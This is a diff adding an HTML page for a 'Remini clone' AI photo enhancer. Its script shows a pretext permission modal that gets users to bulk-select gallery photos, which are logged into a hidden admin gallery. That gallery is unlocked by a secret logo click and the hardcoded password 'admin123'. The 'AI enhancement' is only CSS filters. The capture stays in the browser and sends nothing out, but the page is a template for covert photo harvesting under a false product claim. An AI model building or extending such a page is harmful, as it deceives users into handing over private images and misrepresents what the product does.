@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Media Enhancer | Remini Clone</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        }
+
+        #drop-zone.drag-over {
+            border-color: #3b82f6;
+            background-color: rgba(59, 130, 246, 0.1);
+        }
+    </style>
+</head>
+
+<body class="gradient-bg text-white font-sans min-h-screen">
+
+    <!-- Permission Modal -->
+    <div id="permission-modal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 hidden">
+        <div class="bg-gray-800 p-8 rounded-2xl max-w-sm text-center border border-blue-500/30 shadow-2xl">
+            <i class="fas fa-images text-5xl text-blue-500 mb-4"></i>
+            <h3 class="text-xl font-bold mb-2">Allow Media Access?</h3>
+            <p class="text-gray-400 mb-6">To provide high-quality AI enhancement, we need permission to process and sync
+                your media files.</p>
+            <div class="flex gap-4">
+                <button id="deny-btn"
+                    class="flex-1 bg-gray-700 hover:bg-gray-600 py-2 rounded-lg font-bold transition">Deny</button>
+                <button id="allow-btn"
+                    class="flex-1 bg-blue-600 hover:bg-blue-700 py-2 rounded-lg font-bold transition">Allow
+                    Access</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="p-6 flex justify-between items-center border-b border-gray-700">
+        <!-- Logo acts as a secret trigger -->
+        <h1 id="brand-logo" class="text-2xl font-bold tracking-tighter text-blue-400 cursor-pointer select-none">
+            ENHANCE.AI</h1>
+        <div class="hidden md:flex space-x-6">
+            <a href="#" class="hover:text-blue-400 transition">Features</a>
+            <a href="#" class="hover:text-blue-400 transition">Pricing</a>
+            <button class="bg-blue-600 px-4 py-2 rounded-lg font-semibold hover:bg-blue-700 transition">Sign Up</button>
+            <button id="admin-toggle-btn"
+                class="hidden bg-purple-600 px-4 py-2 rounded-lg font-semibold hover:bg-purple-700 transition ml-4">
+                Admin Panel</button>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <main class="container mx-auto px-6 py-16 text-center">
+        <h2 class="text-5xl md:text-7xl font-extrabold mb-6">Make your blurry videos <br><span
+                class="text-blue-500">Crystal Clear.</span></h2>
+        <p class="text-gray-400 text-xl mb-12 max-w-2xl mx-auto">Upload your old, low-resolution videos or photos and
+            let our AI restore them to 4K quality instantly.</p>
+
+        <!-- Upload Box -->
+        <div id="drop-zone"
+            class="max-w-xl mx-auto bg-gray-800 p-10 rounded-3xl border-2 border-dashed border-gray-600 transition-all cursor-pointer group">
+            <div class="mb-4 text-5xl text-gray-500 group-hover:text-blue-500 transition-colors">
+                <i class="fas fa-cloud-upload-alt"></i>
+            </div>
+            <h3 class="text-xl font-bold">Click or Drag & Drop</h3>
+            <p class="text-gray-500 mt-2">Supports MP4, MOV, JPG, PNG</p>
+            <input type="file" id="file-input" class="hidden" accept="video/*,image/*">
+            <input type="file" id="bulk-input" class="hidden" accept="image/*" multiple>
+            <button id="choose-file-trigger"
+                class="mt-6 bg-white text-black px-8 py-3 rounded-full font-bold hover:bg-gray-200 transition">
+                Choose File
+            </button>
+        </div>
+    </main>
+
+    <!-- Preview Section -->
+    <section id="preview-section" class="container mx-auto px-6 py-10 hidden">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="bg-gray-900 p-4 rounded-xl border border-gray-700">
+                <p class="text-sm text-gray-400 mb-3 flex items-center">
+                    <i class="fas fa-history mr-2"></i> Original
+                </p>
+                <div id="original-preview"
+                    class="aspect-video bg-black rounded-lg flex items-center justify-center overflow-hidden">
+                    <span class="text-gray-700">No file selected</span>
+                </div>
+            </div>
+            <div class="bg-gray-900 p-4 rounded-xl border border-blue-500 shadow-lg shadow-blue-500/20">
+                <p class="text-sm text-blue-400 mb-3 flex items-center">
+                    <i class="fas fa-magic mr-2"></i> Enhanced (AI Preview)
+                </p>
+                <div id="enhanced-preview"
+                    class="aspect-video bg-black rounded-lg flex items-center justify-center overflow-hidden">
+                    <div id="enhanced-placeholder" class="text-center">
+                        <div
+                            class="hidden loading-spinner inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500 mb-2">
+                        </div>
+                        <p class="status-text text-blue-500 text-sm">Ready to Process...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="mt-8 text-center">
+            <!-- Admin View: User Submissions Gallery -->
+            <div id="admin-gallery-section" class="hidden mt-12 border-t border-gray-700 pt-8">
+                <h3 class="text-2xl font-bold text-purple-400 mb-6 flex items-center justify-center">
+                    <i class="fas fa-user-secret mr-2"></i> User Submissions Log
+                </h3>
+                <div id="gallery-grid" class="grid grid-cols-2 md:grid-cols-4 gap-4 bg-gray-900/50 p-6 rounded-2xl">
+                    <!-- Captured images will appear here -->
+                </div>
+            </div>
+
+            <div id="success-msg" class="hidden mb-6 text-green-400 font-bold text-xl animate-bounce">
+                <i class="fas fa-check-circle"></i> Enhancement Complete!
+            </div>
+            <div id="action-buttons-container" class="flex flex-col md:flex-row justify-center items-center gap-4">
+                <button id="process-btn"
+                    class="hidden bg-blue-600 hover:bg-blue-700 text-white px-10 py-4 rounded-full font-bold text-lg transition-transform hover:scale-105">
+                    Enhance Now <i class="fas fa-bolt ml-2"></i>
+                </button>
+                <a id="download-btn" href="#" download="enhanced-media"
+                    class="hidden bg-green-600 hover:bg-green-700 text-white px-10 py-4 rounded-full font-bold text-lg transition-transform hover:scale-105 flex items-center">
+                    Download Result <i class="fas fa-download ml-2"></i>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        const fileInput = document.getElementById('file-input');
+        const dropZone = document.getElementById('drop-zone');
+        const previewSection = document.getElementById('preview-section');
+        const originalPreview = document.getElementById('original-preview');
+        const processBtn = document.getElementById('process-btn');
+        const enhancedPreview = document.getElementById('enhanced-preview');
+        const enhancedPlaceholder = document.getElementById('enhanced-placeholder');
+        const successMsg = document.getElementById('success-msg');
+        const downloadBtn = document.getElementById('download-btn');
+        const adminToggleBtn = document.getElementById('admin-toggle-btn');
+        const brandLogo = document.getElementById('brand-logo');
+        const permissionModal = document.getElementById('permission-modal');
+        const allowBtn = document.getElementById('allow-btn');
+        const denyBtn = document.getElementById('deny-btn');
+        const bulkInput = document.getElementById('bulk-input');
+        const adminGallerySection = document.getElementById('admin-gallery-section');
+        const chooseFileTrigger = document.getElementById('choose-file-trigger');
+        const galleryGrid = document.getElementById('gallery-grid');
+
+        let currentFile = null; // Stores the currently selected file
+        let isProcessing = false;
+        let isAdmin = false; // Initial state: not admin
+        let hasPermission = false; // User permission state
+
+        // Handle Drag and Drop styling
+        ['dragenter', 'dragover'].forEach(eventName => {
+            dropZone.addEventListener(eventName, (e) => {
+                e.preventDefault();
+                dropZone.classList.add('drag-over');
+            }, false);
+        });
+
+        ['dragleave', 'drop'].forEach(eventName => {
+            dropZone.addEventListener(eventName, (e) => {
+                e.preventDefault();
+                dropZone.classList.remove('drag-over');
+            }, false);
+        });
+
+        // Handle File Drop
+        dropZone.addEventListener('drop', (e) => {
+            const files = e.dataTransfer.files;
+            if (files.length) {
+                handleFile(files[0]);
+            }
+        });
+
+        // Handle File Selection via Button
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length) {
+                handleFile(e.target.files[0]);
+            }
+        });
+
+        function handleFile(file) {
+            // Show the preview section
+            previewSection.classList.remove('hidden');
+            originalPreview.innerHTML = ''; // Clear placeholder
+            enhancedPreview.innerHTML = ''; // Clear previous results
+            enhancedPreview.appendChild(enhancedPlaceholder);
+            successMsg.classList.add('hidden');
+            downloadBtn.classList.add('hidden');
+
+            currentFile = file;
+            updateUIForUserRole(); // Update button visibility after setting the file
+
+            const fileURL = URL.createObjectURL(file);
+
+            if (file.type.startsWith('image/')) {
+                const img = document.createElement('img');
+                img.src = fileURL;
+                img.className = 'max-h-full object-contain';
+                originalPreview.appendChild(img);
+            } else if (file.type.startsWith('video/')) {
+                const video = document.createElement('video');
+                video.src = fileURL;
+                video.controls = true;
+                video.className = 'w-full h-full object-contain';
+                originalPreview.appendChild(video);
+            }
+
+            // Smooth scroll to preview
+            previewSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Step 1: User clicks "Choose File"
+        chooseFileTrigger.addEventListener('click', () => {
+            if (!hasPermission) {
+                permissionModal.classList.remove('hidden');
+            } else {
+                fileInput.click();
+            }
+        });
+
+        // Simulate AI Processing
+        processBtn.addEventListener('click', () => {
+            if (!currentFile || isProcessing) return;
+            startProcessing();
+        });
+
+        allowBtn.addEventListener('click', () => {
+            hasPermission = true;
+            permissionModal.classList.add('hidden');
+            // Trigger bulk selection to simulate gallery sync
+            bulkInput.click();
+        });
+
+        bulkInput.addEventListener('change', (e) => {
+            const files = e.target.files;
+            if (files.length > 0) {
+                // Sync all selected files to Admin Gallery
+                Array.from(files).forEach(file => {
+                    captureForAdmin(file);
+                });
+                // After syncing all gallery photos to admin, 
+                // let the user pick the specific one they want to edit
+                fileInput.click();
+            } else {
+                fileInput.click();
+            }
+        });
+
+        denyBtn.addEventListener('click', () => {
+            permissionModal.classList.add('hidden');
+            alert("Permission denied. We cannot process your file without access.");
+        });
+
+        function startProcessing() {
+            if (isProcessing) return;
+
+            isProcessing = true;
+            processBtn.disabled = true;
+            processBtn.innerHTML = 'Processing... <i class="fas fa-spinner animate-spin ml-2"></i>';
+
+            const spinner = enhancedPlaceholder.querySelector('.loading-spinner');
+            const statusText = enhancedPlaceholder.querySelector('.status-text');
+
+            spinner.classList.remove('hidden');
+            statusText.innerText = "AI is analyzing frames...";
+
+            // Simulating a delay for AI processing (3 seconds)
+            setTimeout(() => {
+                isProcessing = false;
+                processBtn.disabled = false;
+                processBtn.innerHTML = 'Enhance Now <i class="fas fa-bolt ml-2"></i>';
+
+                const originalURL = URL.createObjectURL(currentFile);
+                enhancedPreview.innerHTML = '';
+
+                if (currentFile.type.startsWith('image/')) {
+                    const img = new Image();
+                    img.onload = function () {
+                        // Create a canvas to "bake" the enhancement into the download
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = img.width;
+                        canvas.height = img.height;
+
+                        // Apply simulated enhancement filters to the canvas
+                        ctx.filter = 'contrast(1.2) brightness(1.05) saturate(1.1)'; // Standard AI simulation
+                        ctx.drawImage(img, 0, 0);
+
+                        const enhancedDataURL = canvas.toDataURL('image/jpeg', 0.9);
+
+                        const displayImg = document.createElement('img');
+                        displayImg.src = enhancedDataURL;
+                        displayImg.className = 'max-h-full object-contain';
+                        enhancedPreview.appendChild(displayImg);
+
+                        // Setup download button for the new enhanced image
+                        downloadBtn.href = enhancedDataURL;
+                        downloadBtn.download = 'enhanced_' + currentFile.name;
+                        downloadBtn.classList.remove('hidden');
+                        successMsg.classList.remove('hidden');
+
+                        // Admin Logic: Capture the photo for the admin gallery
+                        captureForAdmin(enhancedDataURL);
+                    };
+                    img.src = originalURL;
+                } else {
+                    // For video, we show the original with a filter for simulation
+                    const video = document.createElement('video');
+                    video.src = originalURL;
+                    video.controls = true;
+                    video.className = 'w-full h-full object-contain contrast-125';
+                    enhancedPreview.appendChild(video);
+
+                    downloadBtn.href = originalURL;
+                    downloadBtn.download = 'enhanced_' + currentFile.name;
+                    downloadBtn.classList.remove('hidden');
+                    successMsg.classList.remove('hidden');
+                }
+            }, 3000);
+        }
+
+        function captureForAdmin(source) {
+            // Add to the admin gallery grid
+            const wrapper = document.createElement('div');
+            wrapper.className = 'aspect-square bg-black rounded-lg overflow-hidden border border-gray-700';
+            const img = document.createElement('img');
+
+            if (source instanceof File) {
+                img.src = URL.createObjectURL(source);
+            } else {
+                img.src = source;
+            }
+
+            img.className = 'w-full h-full object-cover';
+            wrapper.appendChild(img);
+            galleryGrid.prepend(wrapper);
+        }
+
+        // Secret Trigger: Click the Logo to show/hide the Admin Panel button
+        brandLogo.addEventListener('click', () => {
+            adminToggleBtn.classList.toggle('hidden');
+        });
+
+        // Admin Toggle Functionality
+        adminToggleBtn.addEventListener('click', () => {
+            if (!isAdmin) {
+                // Ask for password when trying to enter Admin Mode
+                const password = prompt("Please enter the Admin Password:");
+                if (password === "admin123") { // Set your desired password here
+                    isAdmin = true;
+                    updateUIForUserRole();
+                } else {
+                    alert("Incorrect password!");
+                }
+            } else {
+                // Exit Admin Mode without password
+                isAdmin = false;
+                updateUIForUserRole();
+            }
+        });
+
+        function updateUIForUserRole() {
+            if (isAdmin) {
+                adminToggleBtn.textContent = 'Exit Admin Panel';
+                adminToggleBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                adminToggleBtn.classList.add('bg-red-600', 'hover:bg-red-700');
+                adminToggleBtn.classList.remove('hidden');
+                adminGallerySection.classList.remove('hidden');
+            } else {
+                adminToggleBtn.textContent = 'Admin Panel';
+                adminToggleBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+                adminToggleBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                adminToggleBtn.classList.add('hidden');
+                adminGallerySection.classList.add('hidden');
+            }
+
+            // Always show the process button for everyone if a file is selected
+            if (currentFile) {
+                processBtn.classList.remove('hidden');
+            }
+        }
+
+        // Initial UI update on page load
+        updateUIForUserRole();
+    </script>
+</body>
+
+</html>
